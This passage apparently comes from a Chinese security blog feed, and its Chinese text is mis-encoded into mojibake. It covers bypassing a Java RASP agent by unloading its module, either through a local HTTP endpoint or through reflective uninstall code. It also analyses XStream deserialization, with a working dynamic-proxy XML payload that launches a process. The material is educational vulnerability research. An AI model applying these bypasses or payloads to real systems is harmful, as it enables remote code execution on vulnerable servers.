       url = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL(<span class="hljs-string">&quot;http://127.0.0.1:&lt;port&gt;/sandbox/default/module/http/sandbox-module-mgr/unload?action=unload&amp;ids=rasp-rce-native-hook&quot;</span>);<br>            java.net.<span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (java.net.HttpURLConnection) url.openConnection();<br>            connection.setRequestMethod(<span class="hljs-string">&quot;GET&quot;</span>);<br>            connection.setUseCaches(<span class="hljs-literal">false</span>);<br>            connection.setConnectTimeout(<span class="hljs-number">5000</span>); <span class="hljs-comment">// 5 seconds</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> connection.getResponseCode();<br>            java.lang.System.out.println(<span class="hljs-string">&quot;Response Code : &quot;</span> + responseCode);<br>            <span class="hljs-keyword">if</span> (responseCode == java.net.HttpURLConnection.HTTP_OK) &#123;<br>                java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> connection.getInputStream();<br>                java.io.<span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">inputStreamReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(inputStream);<br>                java.io.<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(inputStreamReader);<br><br>                java.lang.String output;<br>                java.lang.<span class="hljs-type">StringBuffer</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.StringBuffer();<br>                <span class="hljs-keyword">while</span> ((output = bufferedReader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                    response.append(output);<br>                &#125;<br>                bufferedReader.close();<br>                inputStreamReader.close();<br>                inputStream.close();<br>                connection.disconnect();<br>                java.lang.System.out.println(<span class="hljs-string">&quot;Response Body: &quot;</span> + response.toString());<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                java.lang.System.out.println(<span class="hljs-string">&quot;Request failed!&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (java.net.MalformedURLException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç äº†ï¼Œè‡³äºæˆ‘ä»¬éœ€è¦å¸è½½çš„æ¨¡å—åç§°åœ¨æ—¥å¿—é‡Œé¢ä¹Ÿæ˜¯èƒ½çœ‹åˆ°çš„ï¼Œæ—¥å¿—çš„è·¯å¾„ä¹Ÿå¯ä»¥åœ¨é¡¹ç›®çš„logback.xmlä¸­çœ‹åˆ°</p><p><img src="https://cdn.clown2024.cn/image-20241111223601498.png" alt="image-20241111223601498"></p><p>å¸è½½å®Œä¹‹åå°±èƒ½æ‰§è¡Œä»»æ„ä»£ç äº†</p><p><strong>ç›´æ¥è°ƒç”¨uninstallæ¥å¸è½½æ¨¡å—</strong></p><p>è¿˜å¯ä»¥ç›´æ¥æ ¹æ®å‰é¢çš„æºç çŸ¥é“ä»–åˆuninstallæ–¹æ³•å¯ä»¥ç”¨æ¥å¸è½½æ¨¡å—ï¼Œå°±å¯ä»¥ç›´æ¥å†™æ¶æ„ä»£ç æ¥å¸è½½æ¨¡å—</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-comment">// ä½¿ç”¨ç±»åŠ è½½å™¨åŠ¨æ€åŠ è½½ AgentLauncher ç±»</span><br>            Class&lt;?&gt; agentLauncherClass = Class.forName(<span class="hljs-string">&quot;com.alibaba.jvm.sandbox.agent.AgentLauncher&quot;</span>);<br><br>            <span class="hljs-comment">// è·å– uninstall æ–¹æ³•</span><br>System.out.println(agentLauncherClass);<br><span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span>Thread.currentThread().getStackTrace()[<span class="hljs-number">1</span>].getClassName();<br>System.out.println(<span class="hljs-string">&quot;å½“å‰ç±»å: &quot;</span> + className);<br>                java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">uninstallMethod</span> <span class="hljs-operator">=</span> agentLauncherClass.getDeclaredMethod(<span class="hljs-string">&quot;uninstall&quot;</span>, String.class);<br><br>uninstallMethod.invoke(<span class="hljs-literal">null</span>, <span class="hljs-string">&quot;default&quot;</span>);<br><br>            System.out.println(<span class="hljs-string">&quot;Sandbox å¸è½½æˆåŠŸï¼&quot;</span>);<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;è°ƒç”¨å¸è½½æ–¹æ³•æ—¶å‡ºé”™: &quot;</span> + e.getMessage());<br>            e.printStackTrace();<br>        &#125;<br></code></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://aiwin.fun/index.php/archives/4389/">https://aiwin.fun/index.php/archives/4389/</a></p><p><a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md</a></p><p><a href="https://dummykitty.github.io/java/2023/06/15/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP.html">https://dummykitty.github.io/java/2023/06/15/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP.html</a></p><p><strong>å¼ºç½‘æ‹Ÿæ€çš„æ–‡ç« </strong></p><p><a href="https://xz.aliyun.com/t/15907?time__1311=GqjxcD2DuDRDyGDlxGo+CfoY5D=eQh4he+D">https://xz.aliyun.com/t/15907?time__1311=GqjxcD2DuDRDyGDlxGo%2BCfoY5D%3DeQh4he%2BD</a></p><p><a href="https://blog.potatowo.top/2024/10/21/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024Web-Writeup">https://blog.potatowo.top/2024/10/21/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024Web-Writeup</a></p><p><a href="https://blog.wm-team.cn/index.php/archives/84">https://blog.wm-team.cn/index.php/archives/84</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;raspä»‹ç»&quot;&gt;&lt;a href=&quot;#RASPä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;RASPä»‹ç»&quot;&gt;&lt;/a&gt;RASPä»‹ç»&lt;/h1&gt;&lt;p&gt;RASPå…¨ç§°æ˜¯Runtime applicaion self-protectionï¼Œåœ¨2014å¿µæå‡ºçš„ä¸€ç§åº”</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>XStreamååºåˆ—åŒ–</title>
    <link href="https://clowsman.github.io/2024/11/04/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/11/04/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-11-03T16:13:50.000Z</published>
    <updated>2024-11-06T07:41:39.449Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xstreamä»‹ç»"><a href="#XStreamä»‹ç»" class="headerlink" title="XStreamä»‹ç»"></a>XStreamä»‹ç»</h1><p>XStreamæ˜¯ä¸€ä¸ªç®€å•çš„åŸºäºJavaåº“ï¼Œèƒ½å¤Ÿå°†Javaå¯¹è±¡å’Œxmlæ–‡æ¡£ä¹‹é—´è¿›è¡Œç›¸äº’è½¬æ¢</p><h1 id="ååºåˆ—åŒ–åŸå› "><a href="#ååºåˆ—åŒ–åŸå› " class="headerlink" title="ååºåˆ—åŒ–åŸå› "></a>ååºåˆ—åŒ–åŸå› </h1><p>XStreamå®ç°äº†ä¸€å¥—åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶ï¼Œæ ¸å¿ƒæ˜¯é€šè¿‡Converterè½¬æ¢å™¨æ¥å°†XMLå’Œå¯¹è±¡ä¹‹é—´è¿›è¡Œç›¸äº’çš„è½¬æ¢ã€‚</p><p>XStreamååºåˆ—åŒ–æ¼æ´çš„å­˜åœ¨æ˜¯å› ä¸ºXStreamæ”¯æŒä¸€ä¸ªåä¸ºDynamicProxyConverterçš„è½¬æ¢å™¨ï¼Œè¯¥è½¬æ¢å™¨å¯ä»¥å°†XMLä¸­dynamic-proxyæ ‡ç­¾å†…å®¹è½¬æ¢æˆåŠ¨æ€ä»£ç†ç±»å¯¹è±¡ï¼Œè€Œå½“ç¨‹åºè°ƒç”¨äº†dynamic-proxyæ ‡ç­¾å†…çš„interfaceæ ‡ç­¾æŒ‡å‘çš„æ¥å£ç±»å£°æ˜çš„æ–¹æ³•æ—¶ï¼Œå°±ä¼šé€šè¿‡åŠ¨æ€ä»£ç†æœºåˆ¶ä»£ç†è®¿é—®dynamic-proxyæ ‡ç­¾å†…handleræ ‡ç­¾æŒ‡å®šçš„ç±»æ–¹æ³•ï¼›</p><p>åˆ©ç”¨è¿™ä¸ªæœºåˆ¶ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„XMLå†…å®¹ï¼Œå³dynamic-proxyæ ‡ç­¾å†…çš„handleræ ‡ç­¾æŒ‡å‘å¦‚EventHandlerç±»è¿™ç§å¯å®ç°ä»»æ„å‡½æ•°åå°„è°ƒç”¨çš„æ¶æ„ç±»ã€interfaceæ ‡ç­¾æŒ‡å‘ç›®æ ‡ç¨‹åºå¿…ç„¶ä¼šè°ƒç”¨çš„æ¥å£ç±»æ–¹æ³•ï¼›æœ€åå½“æ”»å‡»è€…ä»å¤–éƒ¨è¾“å…¥è¯¥æ¶æ„XMLå†…å®¹åå³å¯è§¦å‘ååºåˆ—åŒ–æ¼æ´ã€è¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„ç›®çš„ã€‚</p><h1 id="ç›¸å…³ç±»ä»‹ç»"><a href="#ç›¸å…³ç±»ä»‹ç»" class="headerlink" title="ç›¸å…³ç±»ä»‹ç»"></a>ç›¸å…³ç±»ä»‹ç»</h1><h2 id="eventhandlerç±»"><a href="#EventHandlerç±»" class="headerlink" title="EventHandlerç±»"></a>EventHandlerç±»</h2><p>EventHandleræ˜¯ä¸€ä¸ªå®ç°äº†InvocationHandleræ¥å£çš„ç±»ï¼Œè®¾è®¡æœ¬æ„æ˜¯ä¸ºäº¤äº’å·¥å…·æä¾›beansï¼Œå»ºç«‹ä»ç”¨æˆ·ç•Œé¢åˆ°åº”ç”¨ç¨‹åºé€»è¾‘çš„è¿æ¥</p><p><img src="https://cdn.clown2024.cn/image-20241104142648830.png" alt="image-20241104142648830"></p><p>EventHandlerçš„ç±»ä¸­æœ‰targetå’Œactionå±æ€§ï¼Œåœ¨EventHandler.invoke()-&gt;EventHandler.invokeInternal()-&gt;MethodUtil.invoke()çš„å‡½æ•°è°ƒç”¨é“¾ä¸­ï¼Œä¼šå°†è¿™ä¸¤ä¸ªå±æ€§ä½œä¸ºç±»æ–¹æ³•å’Œå‚æ•°ç»§ç»­åå°„è°ƒç”¨</p><p><img src="https://cdn.clown2024.cn/image-20241104143224758.png" alt="image-20241104143224758"></p><p><img src="https://cdn.clown2024.cn/image-20241104143340622.png" alt="image-20241104143340622"></p><h2 id="converterè½¬æ¢å™¨"><a href="#Converterè½¬æ¢å™¨" class="headerlink" title="Converterè½¬æ¢å™¨"></a>Converterè½¬æ¢å™¨</h2><p>XStreamä¸ºJavaå¸¸è§çš„ç±»å‹æä¾›äº†Converterè½¬æ¢å™¨ã€‚è½¬æ¢å™¨æ³¨å†Œä¸­å¿ƒæ˜¯XStreamç»„æˆçš„æ ¸å¿ƒéƒ¨åˆ†ã€‚</p><p><img src="https://cdn.clown2024.cn/image-20241104143603604.png" alt="image-20241104143603604"></p><p>æˆ‘çœ‹y4å¸ˆå‚…çš„æ–‡ç« ä¸­è¯´è½¬æ¢å™¨éœ€è¦å®ç°ä¸‰ä¸ªæ–¹æ³•ï¼š</p><ul><li>canConvertæ–¹æ³•ï¼šå‘Šè¯‰XStreamå¯¹è±¡ï¼Œå®ƒèƒ½å¤Ÿè½¬æ¢çš„å¯¹è±¡ï¼›</li><li>marshalæ–¹æ³•ï¼šèƒ½å¤Ÿå°†å¯¹è±¡è½¬æ¢ä¸ºXMLæ—¶å€™çš„å…·ä½“æ“ä½œï¼›</li><li>unmarshalæ–¹æ³•ï¼šèƒ½å¤Ÿå°†XMLè½¬æ¢ä¸ºå¯¹è±¡æ—¶çš„å…·ä½“æ“ä½œï¼›</li></ul><p>ä½†æˆ‘åœ¨1.4.10ç‰ˆæœ¬ä¸­åªéœ€è¦å®ç°ä¸¤ç§æ–¹æ³•å³å¯</p><p>XStreamçš„apiæ–‡æ¡£ï¼š<a href="http://x-stream.github.io/converters.html">http://x-stream.github.io/converters.html</a></p><h2 id="åŸºæœ¬ä½¿ç”¨"><a href="#åŸºæœ¬ä½¿ç”¨" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h2><p>ä½¿ç”¨ä¸€ä¸‹çœ‹çœ‹è½¬æ¢å‡ºæ¥çš„xmlé•¿ä»€ä¹ˆæ ·</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Attack;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span>&#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(<span class="hljs-type">int</span> age, String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Student&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Attack;<br><br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>();<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">clown</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-number">150</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">xml</span> <span class="hljs-operator">=</span> xStream.toXML(clown);<br>        System.out.println(xml);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">org.example.Attack.Student</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">age</span>&gt;</span>150<span class="hljs-tag">&lt;/<span class="hljs-name">age</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>clown<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">org.example.Attack.Student</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="åˆ©ç”¨é“¾åˆ†æ"><a href="#åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h1><p>è¿™é‡Œå°±åˆ†æå‡ ä¸ªåˆ©ç”¨é“¾ï¼Œå› ä¸ºXStreamçš„cveæ¯”è¾ƒå¤šï¼Œè€Œä¸”é€‚ç”¨çš„ç‰ˆæœ¬ä¹Ÿä¸ä¸€æ ·ï¼Œå°±è·Ÿç€y4å¸ˆå‚…åˆ†æå…¶æ–‡ç« ä¸­çš„ä¸¤ä¸ªåˆ©ç”¨é“¾</p><p>è½¬åŒ–xmlçš„demo</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;payload.txt&quot;</span>);<br>        <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DomDriver</span>());<br>        xStream.fromXML(fileInputStream);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="sorted-set"><a href="#sorted-set" class="headerlink" title="sorted-set"></a>sorted-set</h2><p>è¿™æ˜¯ä¸€ä¸ªCVE-2013-7258è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</p><h3 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h3><p>1.4.5ï¼Œ1.4.6æˆ–1.4.10ï¼Œæˆ‘è¿™é‡Œç”¨1.4.10ç‰ˆæœ¬æ¥å®éªŒ</p><p>payload</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">sorted-set</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dynamic-proxy</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interface</span>&gt;</span>java.lang.Comparable<span class="hljs-tag">&lt;/<span class="hljs-name">interface</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">handler</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.EventHandler&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">target</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">handler</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dynamic-proxy</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">sorted-set</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241104145857536.png" alt="image-20241104145857536"></p><h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>æˆ‘ä»¬å¯ä»¥ä»æŠ¥é”™çš„è°ƒç”¨æ ˆä¸­å¼€å§‹å…¥æ‰‹åˆ†æï¼Œèƒ½çœ‹å‡ºå…¶å¤§è‡´çš„è°ƒç”¨é“¾æµç¨‹</p><p><img src="https://cdn.clown2024.cn/image-20241106085613877.png" alt="image-20241106085613877"></p><p>å…¶åœ¨AbstractTreeMarshallingStrategy#unmarshalè°ƒç”¨äº†TreeUnmarshaller#startæ–¹æ³•ï¼Œä»è¿™é‡Œå¼€å§‹è§£æxmlå†…å®¹</p><p><img src="https://cdn.clown2024.cn/image-20241106090828942.png" alt="image-20241106090828942"></p><p>è¿™é‡Œä¼šè°ƒç”¨HierarchicalStreams#readClassType()æ¥è·å–åˆ°PoC XMLä¸­æ ¹æ ‡ç­¾çš„ç±»ç±»å‹</p><p>ç´§æ¥ç€ä¸€è·¯å¾€ä¸‹è·Ÿè¿›</p><p><img src="https://cdn.clown2024.cn/image-20241106091233168.png" alt="image-20241106091233168"></p><p>å…¶æœ€ç»ˆåœ¨com.thoughtworks.xstream.mapper.ClassAliasingMapper#realClassä¸­æ‰¾åˆ°äº†SortedSetç±»åï¼ŒnameToTypeæ˜¯ä¸€ä¸ªhashMapç±»å‹å˜é‡</p><p>å›åˆ°å‰é¢ï¼Œè¿™é‡Œæ‹¿åˆ°typeä¹‹åå°±å»è°ƒç”¨convertAnotheræ–¹æ³•æ¥å¯¹è¿”å›çš„typeè¿›è¡Œç±»å‹è½¬åŒ–</p><p><img src="https://cdn.clown2024.cn/image-20241106092001977.png" alt="image-20241106092001977"></p><p>è¯¥æ–¹æ³•å†…éƒ¨å°±æ¶‰åŠåˆ°convertorè½¬æ¢å™¨çš„ä½¿ç”¨ï¼Œè·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://cdn.clown2024.cn/image-20241106092354449.png" alt="image-20241106092354449"></p><p>å…¶ä¸­è°ƒç”¨mapper.defaultImplementationOf()å‡½æ•°æ¥å¯»æ‰¾java.util.SortedSetç±»å‹çš„é»˜è®¤å®ç°ç±»å‹è¿›è¡Œæ›¿æ¢ï¼Œè¿™é‡Œè½¬æ¢ä¸ºäº†java.util.TreeSetç±»å‹</p><p>ç„¶åå°±æ˜¯è°ƒç”¨converterLookup.lookupConverterForTypeæ–¹æ³•æ¥å¯»æ‰¾TreeSetå¯¹åº”çš„ç±»å‹è½¬æ¢å™¨</p><p><img src="https://cdn.clown2024.cn/image-20241106093118079.png" alt="image-20241106093118079"></p><p>è¯¥æ–¹æ³•é‡Œé¢å°±æ˜¯è·å–è¿­ä»£å™¨å¯¹è±¡ï¼Œç„¶åæ‰¾åˆ°TreeSetå¯¹åº”çš„ç±»å‹è½¬åŒ–å™¨å°±è¿”å›</p><p>è¿”å›ä¹‹åå°±æ˜¯è°ƒç”¨convertè¿›è¡Œç±»å‹è½¬æ¢ï¼Œè°ƒç”¨åˆ°AbstractReferenceUnmarshaller#convertæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241106094933449.png" alt="image-20241106094933449"></p><p>ä¼šè·³è¿‡å‰é¢çš„if-elseåˆ¤æ–­ï¼Œæœ€åè¿›åˆ°elseé‡Œé¢ï¼Œè°ƒç”¨getCurrentReferenceKey()æ¥è·å–å½“å‰çš„Referenceé”®å³æ ‡ç­¾åï¼Œæ¥ç€å°†å½“å‰æ ‡ç­¾åå‹å…¥parentStackæ ˆä¸­ï¼Œkeyçš„ç»“æ„å¦‚ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241106095218106.png" alt="image-20241106095218106"></p><p>ç„¶åè°ƒç”¨å…¶çˆ¶ç±»çš„convertæ–¹æ³•ï¼Œåœ¨é‡Œé¢pushåˆ°FastStackçš„å †æ ˆä¸­</p><p><img src="https://cdn.clown2024.cn/image-20241106103638037.png" alt="image-20241106103638037"></p><p>ç„¶åå°±æ˜¯è°ƒç”¨TreeSetConvertçš„unmarshalæ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›åˆ°ä¸€ä¸ªå¡«å……treeMapçš„TreeMapConverter#populateTreeMapæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241106105027698.png" alt="image-20241106105027698"></p><p>è¿™é‡Œå…ˆåˆ¤æ–­æ˜¯å¦æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œæ˜¯çš„è¯å°±è°ƒç”¨putCurrentEntryIntoMap()å‡½æ•°ï¼Œå³å°†å½“å‰å†…å®¹å¡«å……åˆ°Mapä¸­</p><p><img src="https://cdn.clown2024.cn/image-20241106105249406.png" alt="image-20241106105249406"></p><p>é‡Œé¢è°ƒç”¨readItem()å‡½æ•°è¯»å–æ ‡ç­¾å†…çš„å†…å®¹å¹¶ç¼“å­˜åˆ°targetè¿™ä¸ªMapä¸­ï¼Œè·Ÿè¿›å»ç›´åˆ°com.thoughtworks.xstream.mapper.CachingMapper#realClass</p><p><img src="https://cdn.clown2024.cn/image-20241106105555385.png" alt="image-20241106105555385"></p><p>è¿™é‡Œå°±ä¼šå»å¯»æ‰¾dynamic-proxyæ‰€å¯¹åº”çš„ç±»ï¼Œä¸€è·¯è·Ÿè¿›ï¼Œå…¶å¯»æ‰¾çš„æµç¨‹å’Œå‰é¢çš„ç±»ä¼¼</p><p><img src="https://cdn.clown2024.cn/image-20241106110001573.png" alt="image-20241106110001573"></p><p>æœ€åæ˜¯æ‰¾åˆ°äº†DynamicProxyè¿™ä¸ªç±»</p><p>ç„¶åå›åˆ°readItemæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241106110155902.png" alt="image-20241106110155902"></p><p>è·å–åˆ°typeä¹‹åï¼Œå°±å»è°ƒç”¨convertAnotheræ–¹æ³•ï¼Œå’Œå‰é¢ä¸€æ ·å»æ‰¾ç±»å‹è½¬æ¢å™¨</p><p><img src="https://cdn.clown2024.cn/image-20241106110438659.png" alt="image-20241106110438659"></p><p>ä¹‹åä¹Ÿæ˜¯å·®ä¸å¤šçš„æµç¨‹ï¼Œä¸€ç›´åˆ°ä¸‹é¢è¿™ä¸ªå…³é”®çš„åœ°æ–¹ï¼Œcom.thoughtworks.xstream.converters.extended.DynamicProxyConverter#unmarshalæ–¹æ³•å†…éƒ¨</p><p><img src="https://cdn.clown2024.cn/image-20241106110843531.png" alt="image-20241106110843531"></p><p>è¿™é‡ŒæŒ‰æ ‡ç­¾å†…å®¹ç”Ÿæˆå¯¹åº”æ¥å£çš„åŠ¨æ€ä»£ç†ï¼Œæ­¤æ—¶è¿™ä¸ªDUMMYæ˜¯ä¸€ä¸ªç©ºçš„ä»£ç†å®ç°</p><p><img src="https://cdn.clown2024.cn/image-20241106113729142.png" alt="image-20241106113729142"></p><p>ç»§ç»­å¾€ä¸‹æ‰§è¡Œhandler &#x3D; (InvocationHandler)context.convertAnother(proxy, handlerType);</p><p><img src="https://cdn.clown2024.cn/image-20241106113843979.png" alt="image-20241106113843979"></p><p>ç„¶ååˆæ˜¯è°ƒç”¨ç›¸å…³è½¬æ¢å™¨æœ€ç»ˆå¾—åˆ°EventHandler</p><p><img src="https://cdn.clown2024.cn/image-20241106114015121.png" alt="image-20241106114015121"></p><p>ç„¶ååé¢åˆæ˜¯å¾ªç¯å¾—è¯»å–æ ‡ç­¾è·å–å¯¹åº”å¾—ç±»å’Œå†…å®¹</p><p>å›åˆ°å‰é¢è·å–handlerçš„åœ°æ–¹ï¼Œå†å¾€ä¸‹å°±æ˜¯æ›¿æ¢ä»£ç†</p><p><img src="https://cdn.clown2024.cn/image-20241106114840135.png" alt="image-20241106114840135"></p><p>ç„¶åå†å›åˆ°å‰é¢çš„TreeMapConverter#populateTreeMapï¼Œè¿™é‡Œä¼šæŠŠç»“æœæŠŠå­˜åˆ°result</p><p><img src="https://cdn.clown2024.cn/image-20241106115157218.png" 